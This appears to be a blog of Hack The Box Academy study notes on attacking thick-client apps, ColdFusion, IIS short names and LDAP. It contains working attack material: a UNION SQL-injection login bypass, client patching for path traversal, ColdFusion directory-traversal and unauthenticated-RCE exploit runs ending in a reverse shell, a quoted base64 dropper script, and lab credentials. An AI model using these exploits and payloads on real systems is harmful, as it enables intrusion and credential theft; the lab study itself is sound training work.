---
title: "Module19: Attacking Common Application Part 3"
date: 2026-07-07 14:31:00 +0700
categories: [hack-the-box, web-penetration-tester-path]
tags: [learning, red-team, htb, cwes]
---

# SECTION 21: Attacking Thick Client Applications

## Tổng Quan

- **Thick client app**: cài locally, không cần internet, xử lý tại client (khác thin client chạy trên server qua browser).
- Thường viết bằng: Java, C++, .NET, Microsoft Silverlight.
- Kiến trúc:
    - **Two-tier**: app giao tiếp trực tiếp với database.
    - **Three-tier**: app → application server (HTTP/HTTPS) → database (bảo mật hơn).

## Các Lỗ Hổng Phổ Biến

- Improper Error Handling
- Hardcoded sensitive data
- DLL Hijacking
- Buffer Overflow
- SQL Injection
- Insecure Storage
- Session Management

---

## Penetration Testing Steps

### Information Gathering

Xác định kiến trúc, ngôn ngữ, framework, entry points, user inputs.

|Tool|Tool|Tool|Tool|
|---|---|---|---|
|CFF Explorer|Detect It Easy|Process Monitor|Strings|

### Client Side Attacks

- Tìm credentials hardcoded trong local files, source code, memory.
- Static analysis + dynamic analysis.

|Tool|Tool|Tool|Tool|
|---|---|---|---|
|Ghidra|IDA|OllyDbg|Radare2|
|dnSpy|x64dbg|JADX|Frida|

### Network Side Attacks

Capture traffic HTTP/HTTPS hoặc TCP/UDP.

|Wireshark|tcpdump|TCPView|Burp Suite|
|---|---|---|---|

### Server Side Attacks

Tương tự web app attacks — tham chiếu OWASP Top Ten.

---

## Scenario: Retrieve Hardcoded Credentials

### Bước 1 — Phát hiện file tạm

Tìm `RestartOracle-Service.exe` trong SMB share → chạy → không thấy output.

Dùng **ProcMon64** monitor → phát hiện tạo temp file tại `C:\Users\Matt\AppData\Local\Temp`.

### Bước 2 — Chặn auto-delete file tạm

Tắt quyền xóa trên thư mục Temp:

> Properties → Security → Advanced → Edit → bỏ chọn **Delete subfolders and files** + **Delete**

### Bước 3 — Capture batch file

Chạy lại `Restart-OracleService.exe` → lấy file `6F39.bat` trong `C:\Users\cybervaca\AppData\Local\Temp\2`.

```batch
@shift /0
@echo off

if %username% == matt goto correcto
if %username% == frankytech goto correcto
if %username% == ev4si0n goto correcto
goto error

:correcto
echo TVqQAAMAAAAEAAAA//8AALg... > c:\programdata\oracle.txt
<SNIP>
echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1
powershell.exe -exec bypass -file c:\programdata\monta.ps1
del c:\programdata\monta.ps1
del c:\programdata\oracle.txt
c:\programdata\restart-service.exe
del c:\programdata\restart-service.exe
```

Batch file: ghi base64 → `oracle.txt` → decode thành `restart-service.exe` → chạy → xóa tất cả.

### Bước 4 — Recover file bị xóa

Xóa các dòng `del` khỏi batch → chạy lại → giữ lại `oracle.txt` + `monta.ps1`.

```powershell
# monta.ps1
$salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida))
```

Chạy script → thu được `restart-service.exe`.

### Bước 5 — Debug với x64dbg

1. Options → Preferences → bỏ tất cả trừ **Exit Breakpoint**
2. File → Open → chọn `restart-service.exe`
3. CPU view → chuột phải → **Follow in Memory Map**
4. Tìm map có size `0000000000003000`, type `MAP`, protection `-RW--`
5. Double-click → thấy magic bytes `MZ` → đây là embedded executable
6. Chuột phải → **Dump Memory to File**

### Bước 6 — Phân tích dump

```powershell
C:\> C:\TOOLS\Strings\strings64.exe .\restart-service_00000000001E0000.bin
# Output: .NETFramework,Version=v4.0,Profile=Client → là .NET executable
```

Dùng **De4Dot** deobfuscate:

```cmd
# Kéo file vào de4dot.exe
# Output: restart-service_00000000001E0000-cleaned.bin
```

Dùng **DnSpy** đọc source code → phát hiện binary là custom `runas.exe` chứa **hardcoded credentials** để restart Oracle service.

---

## Tổng Hợp Tools

|Giai đoạn|Tools|
|---|---|
|Info gathering|CFF Explorer, Detect It Easy, ProcMon, Strings|
|Static/Dynamic analysis|dnSpy, x64dbg, de4dot, Ghidra, Frida|
|Network|Wireshark, Burp Suite, tcpdump|
|Decompile .NET|dnSpy, De4Dot|

## Question 1
Perform an analysis of C:\Apps\Restart-OracleService.exe and identify the credentials hidden within its source code. Submit the answer using the format username:password.

RDP to with user "cybervaca" and password "&aue%C)}6g-d{w"
```Shell
xfreerdp /v:10.129.228.115 \
/u:cybervaca \
/p:'&aue%C)}6g-d{w' \
/cert:ignore \
/dynamic-resolution
```
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-63bf1eb60c78dde57c361a02f9a5abbc.png)

Access to C:/app
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-2951dd318125620c0fd9d03331cadc32.png)

Start procmon and set filter
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-63ab3dfd2b04fb0f268bf5fec576723e.png)

Run the file 
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-e5a316411fd30ff65574160dfbcc08d0.png)

Finding suspicious operation, and found the path where applications create many files then deletes them.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-d0329c10d12651989516ec9eb7c18db5.png)

Access the folder, but there is nothing noteworthy at there.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-3d302c20009d33cccde1ddb80e51be3a.png)

Change permission of Temp folder to prevent the application to delete file that created.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-66bf3b1487d7f4fe37f5de687665f712.png)

Execute the script again then check the folder. For now a batch script was created.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-b911f24cc6ecf837c0f16b796359181f.png)

Using notepad to check for content of the script
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-d893bc23a46f58b2cf5298c6c06fe64d.png)
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-e05edb03eed7d594e3ccfa5b9c6e22b3.png)

Modify to prevent it to delete the file created.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-f5c218092963049712e759153d17f640.png)

Run batch file
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-2e32b528ee8c672373d39be228d676e8.png)

Check powershell script that created.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-04191f604f691cad36b9dbfaab275eb0.png)

![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-43e70bde362cb50713ef29db9969c67f.png)

Run the script to get restart-service.exe. Run and get the result
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-7a7ccbb8f0b70860ed9a2069758c4a43.png)

Upload file to x64gdb, before that, change the preferences in options to exit break point only.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-cac9dcf2ce1d3203cc22bc20d71399f4.png)
Identify map with wr permission
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-97b8d797510669997e16b101f8fb9469.png)
Find header
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-f5c8f01ad29bae6b97c4f02b4ed4ece2.png)

Using strings64.exe to check for the file
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-0ce9403b1addfc1b1803e2881d773691.png)

use de4dot to clean the file
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-504383935b1186e834e26ad366a638d1.png)

use dnSpy to get username and password.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-6455b6bac4ec22c8cb6f0dcefcef6dcf.png)

# SECTION 22: Khai Thác Web Vulnerabilities trong Thick-Client Applications

## Tổng Quan

- Three-tier architecture ngăn end-user giao tiếp trực tiếp với database, nhưng vẫn dễ bị **SQL Injection** và **Path Traversal**.
- Scenario: tìm được các file sau trên FTP server (anonymous access):
    - `fatty-client.jar`, `note.txt`, `note2.txt`, `note3.txt`
    - Server đã đổi port từ **8000** → **1337**; app dùng Java 8; credentials: `qtc / clarabibi`

---

## Foothold — Sửa JAR để Connect Đúng Port

### Xác định vấn đề

```powershell
# Tìm string "8000" trong các file đã extract
ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List
# → beans.xml, line 13
```

`beans.xml` (Spring config):

```xml
<bean id="connectionContext" class="htb.fatty.shared.connection.ConnectionContext">
   <constructor-arg index="0" value="server.fatty.htb"/>
   <constructor-arg index="1" value="8000"/>   <!-- đổi thành 1337 -->
</bean>
<bean id="secretHolder" class="htb.fatty.shared.connection.SecretHolder">
   <property name="secret" value="clarabibiclarabibiclarabibi"/>
</bean>
```

Thêm hosts entry:

```cmd
echo 10.10.10.174    server.fatty.htb >> C:\Windows\System32\drivers\etc\hosts
```

### Bypass JAR Signature Verification

JAR được ký → SHA-256 hash mismatch khi sửa file. Fix:

- Xóa tất cả hash entries trong `META-INF/MANIFEST.MF`
- Xóa `META-INF/1.RSA` và `META-INF/1.SF`

`MANIFEST.MF` sau khi sửa:

```
Manifest-Version: 1.0
Archiver-Version: Plexus Archiver
Built-By: root
Sealed: True
Created-By: Apache Maven 3.3.9
Build-Jdk: 1.8.0_232
Main-Class: htb.fatty.client.run.Starter
```

Rebuild JAR:

```powershell
cd .\fatty-client
jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *
```

→ Login thành công với `qtc / clarabibi`.

---

## Path Traversal

Server filter ký tự `/` trong input. Giải pháp: **sửa source code client**.

Decompile bằng JD-GUI → sửa `ClientGuiTest.java`:

```java
// Thay "configs" thành ".."
ClientGuiTest.this.currentFolder = "..";
try {
    response = ClientGuiTest.this.invoker.showFiles("..");
```

Compile và rebuild:

```powershell
javac -cp fatty-client-new.jar fatty-client-new.jar.src\htb\fatty\client\gui\ClientGuiTest.java
mkdir raw
cp fatty-client-new.jar raw\fatty-client-new-2.jar
# Extract raw\fatty-client-new-2.jar, overwrite class files
mv -Force fatty-client-new.jar.src\htb\fatty\client\gui\*.class raw\htb\fatty\client\gui\
cd raw
jar -cmf META-INF\MANIFEST.MF traverse.jar .
```

→ FileBrowser → Config hiển thị `configs/../` → thấy `fatty-server.jar`, `start.sh`.

### Download fatty-server.jar

Sửa `open()` trong `Invoker.java` để lưu file về desktop:

```java
import java.io.FileOutputStream;

public String open(String foldername, String filename) throws MessageParseException, MessageBuildException, IOException {
    // ... access check ...
    this.action = new ActionMessage(this.sessionID, "open");
    this.action.addArgument(foldername);
    this.action.addArgument(filename);
    sendAndRecv();
    String desktopPath = System.getProperty("user.home") + "\\Desktop\\fatty-server.jar";
    FileOutputStream fos = new FileOutputStream(desktopPath);
    if (this.response.hasError()) {
        return "Error: Your action caused an error on the application server!";
    }
    byte[] content = this.response.getContent();
    fos.write(content);
    fos.close();
    return "Successfully saved the file to " + desktopPath;
}
```

---

## SQL Injection

### Phân Tích Lỗ Hổng

Decompile `fatty-server.jar` → `FattyDbSession.class`:

```java
// Query không sanitize username
rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");
```

Password được hash theo format:

```java
sha256(username + password + "clarabibimakeseverythingsecure")
```

→ Username injectable, nhưng `' or '1'='1` fail vì password comparison không khớp.

### Bypass bằng UNION Injection

Tạo fake user entry với password và role tùy chọn:

```sql
test' UNION SELECT 1,'abc','a@b.com','abc','admin
```

Query kết quả trên server:

```sql
SELECT id,username,email,password,role FROM users WHERE username='abc' UNION SELECT 1,'abc','a@b.com','abc','admin'
```

**Vấn đề:** client hash password trước khi gửi → server so sánh hash, không khớp.

**Fix:** sửa `setPassword()` trong `User.java` để gửi plaintext:

```java
public void setPassword(String password) {
    this.password = password;
}
```

### Kết Quả

Login với:

- Username: `abc' UNION SELECT 1,'abc','a@b.com','abc','admin`
- Password: `abc`

→ Server trả về user với `role = admin` và `password = abc` → so sánh thành công → **login as admin**.

→ Mở khóa `ServerStatus` menu (Uname, Users, Netstat, Ipconfig).

---
## Tổng Hợp Attack Chain

| Bước | Kỹ thuật                               | Mục tiêu                             |
| ---- | -------------------------------------- | ------------------------------------ |
| 1    | Sửa `beans.xml` + bypass JAR signature | Kết nối đúng port 1337               |
| 2    | Sửa source, rebuild JAR                | Path traversal đọc directory listing |
| 3    | Modify `open()`, rebuild JAR           | Download `fatty-server.jar`          |
| 4    | UNION SQLi + sửa password hashing      | Login với role `admin`               |
## Question 1
What is the IP address of the eth0 interface under the ServerStatus -> Ipconfig tab in the fatty-client application?

Firstly, i scan port, and then discovered FTP service at port 21. Continue to scan nmap with script ftp-anon to check for anonymous login. The result returned successfull.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-9c809ed3344e30dd88aceca66c6e3c35.png)

Access to the server, and then crawl all notes.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-0612b9d6ac02678314bcc0ceca39fd1c.png)

Take note of some noteworthy information
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-a5376dc778679e9a6fe9f8d8fc95882b.png)

Try to run fatty-client.jar, but the error message notice that we are facing an connection error.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-4f82dd828cbcb455b2d688d978fff897.png)
Using wireshark to check the application network behavior. Identified that it was trying to send request through port 8000.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-5ee7994195f865f15199b4b4f6e0bddd.png)
Click on application jar file to extract it. 
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-4e9085fa67469980b2cc200fa7a4410b.png)

![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-e810f305e3733ab510c43f7deacd4ca3.png)

Because i chose wrong option when extract the executable jar file. So, i have to extract it again. The results should look like below.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-bafa71c030c329fe1904985febfc60f7.png)

Using strings tool to check for port config in this folder.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-551385e5871fa97287216c05bb450e20.png)

List content of beans.xml. Identify the port is 8000. Also take note about a secret value.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-02a1426b682c91c098077dcab7f30e49.png)

Change the port number to 1337 as instruction in notes archived before.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-b16b7c12da1b2ef159a42b5a655e1912.png)

Save the beans.xml file then navigate through META-INF folder. Identify 2 files: 1. RSA, 1. SF.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-bd3ef2c3b6841497d6907122e7c0702a.png)

Remove both.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-14b8b80a987a5ea2cf1a4aeb24f73195.png)

Open file MANIFEST.MF and remove all hash identifier. The file must be ended with a new line.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-11d12a4759fc69e3c951560bbcb7df46.png)

Update and run the file 
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-7d3aeda6f3a864b256cb0d7e9bbf2c8b.png)

Run the updated application
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-5273b78300fc12487d26c4019bb7a868.png)

Sign-in as provided credential.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-66baa9024d387704e1f0c12422d53fea.png)

Check for the profile, option: whoami
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-7b9fee968dce2261b0f4aa13e070dc85.png)

Check file browser, options notes
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-d2f87d391ee101a0678d82856beaeccb.png)

Check for security.txt
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-16084c98d3892b5e23f8957514bce8c0.png)

Check for email option
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-0b74ff9867b5792171ef7966c1e67b27.png)

Spot interesting information: The application exist some major security issues.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-2540612ad1f52da6b9456756287bc88d.png)

Check for other file .txt i identified that: The administrative user removed from the data base.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-bd6100664488423553f4895c05759218.png)

Check for path traversal. The result return nothing. Look at the warning message, we can pretty sure that the application is filter '/' character.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-37228177cb1003a1d7d7044e223eb309.png)

Decompile the new jar file using jq.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-b666499c550da01a3a3dc88f2ea9ff58.png)
Save it 
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-0d844302b1668f4b969e7f2b3c774c6a.png)
Extract the file 
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-824433151742da73156e8f5a84d5e98a.png)

List content of Invoker to check for function that take responsibility to show files.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-662cc7e5aa1235540246e1a81be6aca7.png)

Check for action that show options configs
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-02ef0d15099c55a2bf77b46212d7256a.png)

Change it value from configs to '..'
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-84b98fb045b747a6157afc9ceab0f81d.png)

Rebuild it
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-df2ab9e72142484e134d30cf2632d779.png)

![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-b13ba863ca5da7f46acffb3b211977e1.png)

![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-b4bd03d2559a9a7bda031fb3cc7c2b37.png)

![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-92a64df629a81aaf6f6233026ee2fa06.png)

Run the new appliction
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-d7eb187cc9478a2a8d941141d845dafc.png)

Check for start.sh
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-d57c21b16af8ec81c6de60aefd5d0361.png)

Modify the Invoker to retrieved fatty-server.jar
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-7ffdb3fca613a25d1092bad5233bf113.png)

![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-57ec57e966f78174673d986b4ec46ca6.png)

![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-2641929cef0d40bbe674cb40b64c2a18.png)

Rebuild the application
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-965bc2ced3df703b669dbe4ae6d2fcac.png)

![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-67493d6689eab8f9bc7e4631382fe3bd.png)

![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-64021c675c2ad1c8d040215be39c2092.png)

![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-3329cde5c36e93988b126d18e559d8b6.png)

Start application and get the file.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-e24436020b5349388d3c6476e3895577.png)

![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-7ad18a85adf91a00a2eeb8619ae51e02.png)

Compile it and check for login function
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-45e6b4922a33d63f9b1dd99f7f07535a.png)

![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-a991c5de5da5ec630e32c9cdda14c603.png)

Check for login process in client 
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-79fffee7040891f9e85b006d133c6810.png)

Identify get password mechanism 
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-3f99f67bc3f8e17363ce83e79711df95.png)

![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-22b05d67747f20bd7f080e3f6e6bbb74.png)

Modify it.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-c2a7a2c912f748491793f5f23cd746fa.png)

Rebuild the application.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-61208f6e97101486e09c89c90cf2ec90.png)

Applied SQLi to login with admin role.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-f477beb9bb30bf5023f927f17feb827f.png)

![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-13e765de923dcaaecce9c31fa7a3e7e6.png)
# SECTION 23: ColdFusion - Discovery & Enumeration

## Tổng Quan

- Web application development platform dựa trên Java; phát triển bởi Allaire (1995) → Macromedia → Adobe.
- Ngôn ngữ: **CFML (ColdFusion Markup Language)** — tag-based, syntax tương tự HTML.
- Kết nối database: MySQL, Oracle, Microsoft SQL Server.
- Chạy trên Windows, Mac, Linux; deploy được trên AWS, Azure.
- File extension đặc trưng: `.cfm`, `.cfc`.
## CVE Đáng Chú Ý

| CVE            | Mô tả                                         |
| -------------- | --------------------------------------------- |
| CVE-2021-21087 | Arbitrary JSP source code upload bypass       |
| CVE-2020-24453 | Active Directory integration misconfiguration |
| CVE-2020-24450 | Command injection                             |
| CVE-2020-24449 | Arbitrary file read                           |
| CVE-2019-15909 | XSS                                           |

## Default Ports

|Port|Protocol|Mô tả|
|---|---|---|
|80|HTTP|Web|
|443|HTTPS|Web (SSL)|
|8500|SSL|Server communication — **quan trọng nhất**|
|1935|RPC|Client-server|
|25|SMTP|Email|
|5500|Server Monitor|Remote admin|

---

## Enumeration

### Phương pháp nhận dạng ColdFusion

|Method|Chi tiết|
|---|---|
|Port Scanning|Port 8500 (SSL), 80, 443|
|File Extensions|`.cfm`, `.cfc`|
|HTTP Headers|`Server: ColdFusion`, `X-Powered-By: ColdFusion`|
|Error Messages|References to CFML tags/functions|
|Default Files|`admin.cfm`, `CFIDE/administrator/index.cfm`|

### Nmap Scan

```bash
nmap -p- -sC -Pn 10.129.247.30 --open
```

**Output:**

```
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown
```

### Fingerprint qua Directory Listing

- Browse `http://10.129.247.30:8500/` → thấy 2 thư mục: `CFIDE/` và `cfdocs/` → xác nhận ColdFusion.
- Browse `/CFIDE/administrator/` → **ColdFusion 8 Administrator login page** → xác định chính xác version.

```
http://10.129.247.30:8500/CFIDE/administrator/index.cfm
```

> VM có thể respond chậm đến 90 giây — cần kiên nhẫn chờ.
## Question 1
What ColdFusion protocol runs on port 5500?
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-c83447022201d05f4a9531cbac8d8d46.png)
# SECTION 24: Attacking ColdFusion

## Searchsploit

```bash
searchsploit adobe coldfusion
```

Kết quả quan trọng cho ColdFusion 8:

- `Adobe ColdFusion - Directory Traversal` → `multiple/remote/14641.py`
- `Adobe ColdFusion 8 - Remote Command Execution (RCE)` → `cfm/webapps/50057.py`

---

## Directory Traversal (CVE-2010-2861)

- Ảnh hưởng: ColdFusion 9.0.1 trở về trước.
- Khai thác qua tham số `locale` trong các file:
    - `CFIDE/administrator/settings/mappings.cfm`
    - `CFIDE/administrator/enter.cfm`
    - `logging/settings.cfm`, v.v.

```http
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
```

**Khai thác bằng script:**

```bash
searchsploit -p 14641
cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
python2 14641.py
# usage: 14641.py <host> <port> <file_path>
```

**Đọc `password.properties` (chứa encrypted passwords):**

```bash
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```

```
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
```

> `password.properties` nằm tại `[cf_root]/lib/` — chứa credentials cho database, mail server, LDAP.

---
## Unauthenticated RCE (CVE-2009-2265)

- Ảnh hưởng: ColdFusion 8.0.1 trở về trước.
- Lỗ hổng trong **FCKeditor** package — cho phép upload file không cần auth.

```http
http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
```

**Khai thác:**

```bash
searchsploit -p 50057
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```

Sửa các biến trong script:

```python
lhost = '10.10.14.55'   # HTB VPN IP
lport = 4444
rhost = "10.129.247.30" # Target IP
rport = 8500
```

```bash
python3 50057.py
```

**Output:**

```
Generating a payload...
Saved as: 1269fd7bd2b341fab6751ec31bbfb610.jsp
Listening for connection...
Ncat: Connection from 10.129.247.30:49866.
```

```cmd
Microsoft Windows [Version 6.1.7600]
C:\ColdFusion8\runtime\bin>
```

---

## Tổng Hợp

|CVE|Loại|Điều kiện|Kết quả|
|---|---|---|---|
|CVE-2010-2861|Directory Traversal|Unauthenticated, CF ≤ 9.0.1|Đọc file tùy ý (password.properties)|
|CVE-2009-2265|Unauthenticated RCE|CF 8.0.1 trở về trước|Upload JSP shell → reverse shell|

## Question 1
What user is ColdFusion running as?

Using CVE script to access to gain RCE
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-cc879af3ce1b267fc631698feb47b386.png)

Get user
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-9897e85babf44f01c091b65e7c107f7d.png)

# SECTION 25: IIS Tilde Enumeration

## Tổng Quan

- Kỹ thuật dùng để tìm **hidden files, directories, short file names (8.3 format)** trên IIS.
- Windows tự động tạo short file name dạng `8.3` cho mọi file/folder (8 ký tự tên + `.` + 3 ký tự extension).
- Short file name vẫn có thể truy cập qua URL dù file/folder đó bị ẩn.

**Cơ chế:**

- Ký tự `~` theo sau bởi sequence number → đánh dấu short file name trong URL.
- Ví dụ: `SecretDocuments` → short name `secret~1`

**Quy trình brute-force thủ công:**

```http
http://example.com/~s      → 200 OK → có dir bắt đầu bằng "s"
http://example.com/~se     → 200 OK → tiếp tục thêm ký tự
http://example.com/~sec    → 200 OK
...
http://example.com/secret~1/somefile.txt
http://example.com/secret~1/somefi~1.txt
```

> Số sau `~` là unique identifier phân biệt file trùng tên:  
> `somefile.txt` → `somefi~1.txt`  
> `somefile1.txt` → `somefi~2.txt`

---

## Enumeration

### Nmap Scan

```bash
nmap -p- -sV -sC --open 10.129.224.91
```

```
80/tcp open  http  Microsoft IIS httpd 7.5
```

→ IIS 7.5 → vulnerable to tilde enumeration.

### IIS-ShortName-Scanner

```bash
java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
```

```
|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): /~1/
|_ Identified directories: 2
    |_ ASPNET~1
    |_ UPLOAD~1
|_ Identified files: 3
    |_ CSASPX~1.CS
    |_ TRANSF~1.ASP
```

→ Tìm được `TRANSF~1.ASP` nhưng không GET được → cần brute-force full filename.

---

### Generate Wordlist

```bash
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```

- `egrep -r ^transf` → tìm tất cả dòng bắt đầu bằng `transf`
- `sed 's/^[^:]*://'` → xóa phần `filename:` ở đầu mỗi dòng
- Kết quả lưu vào `/tmp/list.txt`

### Gobuster Enumeration

```bash
gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
```

```
/transf**.aspx   (Status: 200) [Size: 941]
```

→ Tìm được full filename `.aspx` tương ứng với short name `TRANSF~1.ASP`.


  

## Question 1
What is the full .aspx filename that Gobuster identified?

Port scanning
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-df05167b89b7bf091ee10cfd61377245.png)

![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-480adc88e1f1330077c57e58de017b73.png)

![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-f1f542f3d88abcc5fe37fe2124f16e4e.png)

# SECTION 26: LDAP

## Tổng Quan LDAP

- **LDAP (Lightweight Directory Access Protocol):** protocol truy cập và quản lý directory information (users, groups, computers, printers...).
- Chạy trên **TCP/IP**, port **389** (LDAP) hoặc **636** (LDAPS).
- Hai implementation phổ biến: **OpenLDAP** (open-source) và **Microsoft Active Directory**.

### Ưu điểm

- Query nhanh, hiệu quả; hỗ trợ platform-independent.
- Authentication tập trung (SSO across multiple resources).

### Nhược điểm

|Vấn đề|Chi tiết|
|---|---|
|Không mã hóa mặc định|Cần LDAPS hoặc StartTLS|
|LDAP Injection|Không validate input → attacker thao túng query|
|Complexity|Khó cấu hình đúng|

### LDAP vs Active Directory

|LDAP|Active Directory|
|---|---|
|Protocol (open, cross-platform)|Directory service (Windows-only)|
|Nhiều auth mechanism (simple bind, SASL)|Kerberos primary, hỗ trợ NTLM|
|Schema linh hoạt|Schema cố định, mở rộng cẩn thận|

---

## ldapsearch

```bash
ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
```

**Response:**

```ldap
dn: uid=jdoe,ou=people,dc=example,dc=com
objectClass: inetOrgPerson
cn: John Doe
mail: john.doe@example.com

result: 0 Success
```

---

## LDAP Injection

### Cơ chế

Tương tự SQL Injection nhưng target LDAP directory. Attacker inject special characters vào LDAP query.

**Ký tự đặc biệt:**

|Input|Ý nghĩa|
|---|---|
|`*`|Wildcard — match mọi chuỗi|
|`( )`|Group expressions|
|`\|`|Logical OR|
